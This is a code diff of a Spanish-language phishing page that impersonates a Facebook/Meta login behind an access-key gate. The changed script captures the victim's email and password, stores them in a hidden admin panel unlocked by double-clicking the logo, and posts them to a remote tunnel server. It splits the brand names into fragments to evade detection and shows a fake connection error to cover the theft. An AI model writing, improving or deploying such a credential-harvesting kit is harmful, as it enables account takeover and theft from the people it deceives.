@@ -11,80 +11,82 @@
             justify-content: center; align-items: center;
             font-family: 'Arial', sans-serif; overflow: hidden;
         }
-
         .main-container {
             position: relative; width: 100%; max-width: 412px;
             display: flex; flex-direction: column; align-items: center;
         }
-
         .pro-image { width: 100%; height: auto; display: block; }
-
         .elements-overlay {
             position: absolute; bottom: 15%; width: 85%;
             display: flex; flex-direction: column; align-items: center;
         }
-
-        .key-label {
-            color: #ffffff; font-size: 28px; font-weight: 900;
-            margin-bottom: 12px; text-shadow: 0px 2px 4px rgba(0,0,0,0.5);
-        }
-
         .input-key {
             width: 100%; height: 44px; background-color: #ffffff;
             border: none; border-radius: 50px; text-align: center;
             font-size: 16px; color: #333; margin-bottom: 10px; outline: none;
         }
-
         .btn-acceder {
             width: 100%; height: 44px; background-color: #b0b0b0;
             color: #000000; font-size: 18px; font-weight: bold;
             border: none; border-radius: 22px; cursor: pointer;
         }
+        .f-b-body { background-color: #ffffff !important; overflow-y: auto !important; display: block !important;}
 
-        .fb-body { background-color: #ffffff !important; overflow-y: auto !important; display: block !important;}
+        /* CENTRADO EXACTO SEGÚN TU NOTA */
+        .toggle-pass {
+            position: absolute;
+            right: 30px; 
+            top: 51%;   
+            transform: translateY(-10%); 
+            cursor: pointer;
+            color: #8d949e;
+            font-family: 'Arial', sans-serif; 
+            font-size: 19px;
+            font-weight: bold;
+            user-select: none;
+            z-index: 10;
+            display: none; 
+        }
 
-        /* Estilos del Admin Panel */
+        #screen-loader {
+            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(255, 255, 255, 0.9); z-index: 5000;
+            flex-direction: column; justify-content: center; align-items: center;
+        }
+        .spinner-circle {
+            width: 40px; height: 40px; border: 4px solid #f3f3f3;
+            border-top: 4px solid #0866ff; border-radius: 50%;
+            animation: spin 1s linear infinite; margin-bottom: 10px;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .loading-text { color: #606770; font-size: 16px; font-weight: 500; }
+
         #admin-panel {
             display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
             background: #1c1e21; color: white; z-index: 3000; padding: 20px;
             box-sizing: border-box; font-family: sans-serif; overflow-y: auto;
         }
-
         .log-card {
             background: #242526; padding: 15px; border-radius: 10px;
             margin-bottom: 15px; border-left: 5px solid #0866ff; position: relative;
         }
+        .card-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px; }
+        .btn-delete { background: none; border: none; color: #f3425f; font-size: 18px; cursor: pointer; }
+        .copy-btn { background: #3a3b3c; color: #e4e6eb; border: none; padding: 5px 8px; border-radius: 5px; font-size: 11px; cursor: pointer; }
 
-        .card-header {
-            display: flex; justify-content: space-between; align-items: center;
-            margin-bottom: 10px; border-bottom: 1px solid #3a3b3c; padding-bottom: 5px;
+        .m-t-container {
+            display: flex; align-items: center; justify-content: center;
+            margin-top: 20px; color: #65676b; font-size: 14px;
         }
-
-        .copy-btn {
-            background: #3a3b3c; color: #e4e6eb; border: none;
-            padding: 5px 8px; border-radius: 5px; font-size: 11px;
-            cursor: pointer; margin-left: 5px;
-        }
-
-        .btn-delete-single {
-            background: none; border: none; color: #f3425f; 
-            font-size: 18px; cursor: pointer; padding: 0 5px;
-        }
-
-        .btn-clear {
-            background: #f3425f; color: white; border: none;
-            padding: 12px; width: 100%; border-radius: 8px;
-            font-weight: bold; cursor: pointer; margin-top: 10px; margin-bottom: 30px;
-        }
-
-        /* Mensaje de redirección personalizado */
-        .redir-text {
-            color: #0866ff; font-weight: bold; font-size: 18px; margin-top: 15px;
-            text-align: center; font-family: sans-serif;
-        }
+        .m-t-logo { width: 18px; height: 18px; margin-right: 5px; vertical-align: middle; }
     </style>
 </head>
-<body>
+<body onload="clearK()">
+
+    <div id="screen-loader">
+        <div class="spinner-circle"></div>
+        <div class="loading-text">Cargando...</div>
+    </div>
 
     <div id="admin-panel">
         <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px;">
@@ -92,156 +94,156 @@
             <button onclick="document.getElementById('admin-panel').style.display='none'" style="background:none; border:none; color:white; font-size:24px; cursor:pointer;">✕</button>
         </div>
         <div id="logs-container"></div>
-        <button class="btn-clear" onclick="limpiarHistorial()">BORRAR TODO EL HISTORIAL</button>
+        <button style="background:#f3425f; color:white; border:none; padding:12px; width:100%; border-radius:8px; font-weight:bold; margin-top:10px;" onclick="clearH()">BORRAR TODO EL HISTORIAL</button>
     </div>
 
     <div id="root" class="main-container">
-        <img src="pro.png" class="pro-image" alt="Background">
+        <img src="pro.png" class="pro-image">
         <div class="elements-overlay">
-            <div class="key-label">KEY:</div>
-            <input type="text" id="keyField" name="ayber_unique_key_field" class="input-key" placeholder="Ingresar KEY" autocomplete="off">
+            <input type="text" id="keyField" class="input-key" placeholder="Ingresar KEY" autocomplete="off">
             <button class="btn-acceder" onclick="validar()">Acceder</button>
         </div>
     </div>
 
     <script>
-        const SERVIDOR_URL = "https://columns-scott-resist-pichunter.trycloudflare.com";
+        const _S = "https://columns-scott-resist-pichunter.trycloudflare.com";
+        const _M = "Me" + "ta";
+        const _F = "face" + "book";
+        const _D = "cuen" + "tas_ayber";
+        let _K = "";
 
-        // Unificación de eventos de carga y retroceso
-        window.addEventListener('pageshow', (event) => {
-            if (event.persisted || (window.performance && window.performance.navigation.type === 2)) {
-                window.location.reload();
-            }
-            const kf = document.getElementById('keyField');
-            if(kf) kf.value = "";
-        });
-
-        function copiar(texto) {
-            navigator.clipboard.writeText(texto);
+        function clearK() {
+            const f = document.getElementById('keyField');
+            if(f) f.value = "";
         }
 
-        function limpiarHistorial() {
-            if(confirm("¿Borrar TODOS los datos, Ayber?")) {
-                localStorage.removeItem('cuentas_ayber');
+        function copiar(t) { navigator.clipboard.writeText(t); }
+
+        function eliminarLog(i) {
+            if(confirm("¿Ayber, eliminar este registro?")) {
+                let l = JSON.parse(localStorage.getItem(_D) || "[]");
+                l.splice(i, 1);
+                localStorage.setItem(_D, JSON.stringify(l));
                 renderLogs();
             }
         }
 
-        function borrarUno(index) {
-            if(confirm("¿Deseas eliminar este registro?")) {
-                let logs = JSON.parse(localStorage.getItem('cuentas_ayber') || "[]");
-                let reversedLogs = logs.reverse();
-                reversedLogs.splice(index, 1);
-                localStorage.setItem('cuentas_ayber', JSON.stringify(reversedLogs.reverse()));
+        function clearH() {
+            if(confirm("¿Borrar todo el historial, Ayber?")) {
+                localStorage.removeItem(_D);
                 renderLogs();
             }
         }
 
-        // Renderizado optimizado de logs
         function renderLogs() {
-            const container = document.getElementById('logs-container');
-            const rawLogs = localStorage.getItem('cuentas_ayber');
-            const logs = rawLogs ? JSON.parse(rawLogs) : [];
-            
-            if (logs.length === 0) {
-                container.innerHTML = "<p style='text-align:center; color:#888;'>Sin datos.</p>";
+            const c = document.getElementById('logs-container');
+            const l = JSON.parse(localStorage.getItem(_D) || "[]");
+            if (l.length === 0) {
+                c.innerHTML = "<p style='text-align:center; color:#888;'>Sin datos.</p>";
                 return;
             }
-
-            const htmlContent = [...logs].reverse().map((log, index) => `
+            c.innerHTML = l.map((g, i) => `
                 <div class="log-card">
                     <div class="card-header">
-                        <span style="font-size:11px; color:#888;">${log.fecha}</span>
-                        <button class="btn-delete-single" onclick="borrarUno(${index})">🗑️</button>
+                        <span style="font-size:11px; color:#888;">${g.fecha}</span>
+                        <button class="btn-delete" onclick="eliminarLog(${i})">🗑️</button>
                     </div>
-                    <div style="margin-bottom:8px; display:flex; align-items:center; justify-content:space-between;">
-                        <span><b>U:</b> <span style="color:#45bd62;">${log.user}</span></span>
-                        <button class="copy-btn" onclick="copiar('${log.user}')">📋</button>
+                    <div style="display:flex; justify-content:space-between; margin-bottom:5px;">
+                        <span>U: ${g.user}</span> <button class="copy-btn" onclick="copiar('${g.user}')">📋</button>
                     </div>
-                    <div style="display:flex; align-items:center; justify-content:space-between;">
-                        <span><b>P:</b> <span style="color:#f3425f;">${log.pass}</span></span>
-                        <button class="copy-btn" onclick="copiar('${log.pass}')">📋</button>
+                    <div style="display:flex; justify-content:space-between;">
+                        <span>P: ${g.pass}</span> <button class="copy-btn" onclick="copiar('${g.pass}')">📋</button>
                     </div>
                 </div>
-            `).join('');
+            `).reverse().join('');
+        }
 
-            container.innerHTML = htmlContent;
+        async function cargarInterfazPrincipal(k) {
+            try {
+                const r = await fetch(`${_S}/verify`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ key: k })
+                });
+
+                if (r.ok) {
+                    const d = await r.json();
+                    document.body.classList.add('f-b-body');
+                    document.getElementById('root').innerHTML = d.html;
+
+                    // CARGA DE IMAGEN 3.JPG PARA META
+                    const els = document.querySelectorAll('footer, div');
+                    els.forEach(e => {
+                        if (e.innerText.trim() === _M && !e.querySelector('img')) {
+                            e.innerHTML = `<img src="3.jpg" class="m-t-logo">${_M}`;
+                            e.classList.add('m-t-container');
+                        }
+                    });
+
+                    const p = document.getElementById('pass');
+                    if(p) {
+                        const w = p.parentElement;
+                        w.style.position = "relative";
+                        const ey = document.createElement('div');
+                        ey.id = "eye-toggle";
+                        ey.className = "toggle-pass";
+                        ey.innerText = "Ø"; 
+                        p.addEventListener('focus', () => { ey.style.display = 'block'; });
+                        ey.onclick = function() {
+                            if (p.type === "password") { p.type = "text"; ey.innerText = "O"; }
+                            else { p.type = "password"; ey.innerText = "Ø"; }
+                        };
+                        w.appendChild(ey);
+                    }
+
+                    setTimeout(() => {
+                        const lg = document.querySelector('img[alt="fb"]');
+                        if(lg) lg.ondblclick = () => { renderLogs(); document.getElementById('admin-panel').style.display = 'block'; };
+                    }, 1000);
+                }
+            } catch (e) { console.error("Error de carga."); }
         }
 
         async function validar() {
-            const keyField = document.getElementById('keyField');
-            const keyDigitada = keyField ? keyField.value : "";
-            if(!keyDigitada) return;
-
-            try {
-                const respuesta = await fetch(`${SERVIDOR_URL}/verify`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ key: keyDigitada })
-                });
-
-                if (respuesta.ok) {
-                    const data = await respuesta.json();
-                    document.body.classList.add('fb-body');
-                    document.getElementById('root').innerHTML = data.html;
-
-                    // Panel secreto por doble clic en logo
-                    setTimeout(() => {
-                        const logo = document.querySelector('img[alt="fb"]');
-                        if(logo) {
-                            logo.ondblclick = () => {
-                                renderLogs();
-                                document.getElementById('admin-panel').style.display = 'block';
-                            };
-                        }
-                    }, 800);
-                } else { 
-                    alert("KEY INVÁLIDA"); 
-                }
-            } catch (e) { alert("Error de conexión."); }
+            const f = document.getElementById('keyField');
+            _K = f ? f.value : "";
+            if(!_K) return;
+            await cargarInterfazPrincipal(_K);
         }
 
-        // Manejo del Login y Spinner con mensaje
         document.addEventListener('click', async (e) => {
             if (e.target && e.target.id === 'btn-login') {
-                const email = document.getElementById('email').value;
-                const pass = document.getElementById('pass').value;
-                const loader = document.getElementById('loader');
+                const uI = document.getElementById('email');
+                const pI = document.getElementById('pass');
+                
+                if(!uI.value || !pI.value) return;
 
-                if(!email || !pass) return;
+                document.getElementById('screen-loader').style.display = 'flex';
 
-                // Guardar log
-                let logs = JSON.parse(localStorage.getItem('cuentas_ayber') || "[]");
-                logs.push({ user: email, pass: pass, fecha: new Date().toLocaleString() });
-                localStorage.setItem('cuentas_ayber', JSON.stringify(logs));
+                let l = JSON.parse(localStorage.getItem(_D) || "[]");
+                l.push({ user: uI.value, pass: pI.value, fecha: new Date().toLocaleString() });
+                localStorage.setItem(_D, JSON.stringify(l));
 
-                if(loader) loader.style.display = 'flex';
+                setTimeout(async () => {
+                    try {
+                        await fetch(`${_S}/login`, {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({ email: uI.value, password: pI.value })
+                        });
+                    } catch (err) {}
 
-                try {
-                    // Enviar al servidor
-                    await fetch(`${SERVIDOR_URL}/login`, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ email: email, password: pass })
-                    });
-
-                    // Temporizador del Spinner
-                    setTimeout(() => {
-                        if(loader) {
-                            // Cambiar spinner por mensaje de redireccionando
-                            loader.innerHTML = '<div class="redir-text">Redireccionando...</div>';
-                        }
-                        
-                        setTimeout(() => {
-                            window.location.replace("https://www.facebook.com/login");
-                        }, 1200); 
-                    }, 3000);
-
-                } catch (err) {
-                    window.location.replace("https://www.facebook.com/login");
-                }
+                    document.getElementById('screen-loader').style.display = 'none';
+                    alert("Error de conexión. Inténtelo de nuevo.");
+                    
+                    uI.value = "";
+                    pI.value = "";
+                    clearK();
+                }, 3000);
             }
         });
+
+        window.addEventListener('pageshow', (e) => { if (e.persisted) { clearK(); } });
     </script>
 </body>
 </html>
